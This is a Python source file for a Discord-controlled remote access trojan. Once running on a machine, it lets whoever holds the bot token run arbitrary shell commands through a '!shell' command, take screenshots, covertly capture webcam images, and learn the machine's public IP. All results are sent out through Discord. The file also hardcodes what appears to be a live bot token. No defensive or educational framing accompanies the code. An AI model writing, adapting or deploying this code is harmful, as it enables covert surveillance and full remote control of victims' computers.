
from discord.ext import commands
import cv2
import discord
import platform
import os
import pyautogui
import time
import requests

TOKEN = "Njk1OTYzODAwNzI1MDk0NTIx.XsL3Rw.7Zjynz6ZzS2NN9GnaslRB2iHSVg"
ip = requests.get('https://api.ipify.org').text
bot = commands.Bot(command_prefix='!')

@bot.command(name='getOs')
async def getOS(ctx):
    system = platform.system()
    await ctx.send(system)

@bot.command(name='shell')
async def shell(ctx, commandShell: str, *args):
    commandeFull = commandShell

    if (len(args) > 0 ):
        for i in args:
            commandeFull = commandeFull + " " + i
    output = os.popen(commandeFull).read()
    print(output)
    if (output != ""):
        await ctx.send(output)
    else:
        await ctx.send('Error command')

@bot.command(name='screenshot')
async def screen(ctx):
    screen = pyautogui.screenshot()
    screen.save(r'./screen.png')
    await ctx.send(file=discord.File('./screen.png'))
    

@bot.command(name='list')
async def giveInfo(ctx):
    await ctx.send(ip)

@bot.command(name='camshot')
async def getCamImg(ctx):
    cam = cv2.VideoCapture(0)

    ret, frame = cam.read()
    cv2.imwrite("cam.png", frame)
    cam.release()
    await ctx.send(file=discord.File('./cam.png'))

@bot.listen()
async def on_ready():
    print('Logged in as')
    print(bot.user.name)
    print(bot.user.id)
    print('------')



bot.run(TOKEN, bot=True)